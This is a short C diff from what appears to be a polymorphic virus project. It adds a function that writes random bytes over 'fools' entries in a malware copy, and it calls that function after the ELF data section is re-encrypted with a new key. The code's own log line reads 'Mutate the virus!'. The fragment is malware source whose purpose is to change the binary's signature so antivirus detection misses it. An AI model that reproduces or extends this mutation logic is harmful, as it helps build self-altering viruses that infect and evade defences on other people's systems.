@@ -36,6 +36,15 @@ uint64_t generate_key(Globals *global){
     return key;
 }
 
+void mutate_fools(Globals *global){
+    for(int i=0; i<global->lib->n_fools_offsets; i++){
+        uint64_t offset = global->lib->fools_offsets[i];
+
+        // write new random bytes to fools entry
+        *(uint64_t *)(global->malware_copy + offset) = generate_key(global);
+    }
+}
+
 void mutate_lib(Globals* global){
     DEBUG_LOG("Mutate the virus!\n");
     MaLib *lib = global->lib;
@@ -48,10 +57,12 @@ void mutate_lib(Globals* global){
     
     // encrypt the data with the new key
     global->encrypt_layered((void *)(file_buffer+lib->elf_offset_data), lib->data_length, (char*)&key);
-    //global->xor_memory((void *)(file_buffer+lib->elf_offset_data), lib->data_length, (char*)&key);
     
     // write the new key to the new file
     *(uint64_t *)(file_buffer+lib->elf_offset_key) = key;
     DEBUG_LOG("(%lx)🎲\n", *(uint64_t *)(file_buffer+lib->elf_offset_key));
+
+    // mutate fool_ls entries
+    mutate_fools(global);
 }
 
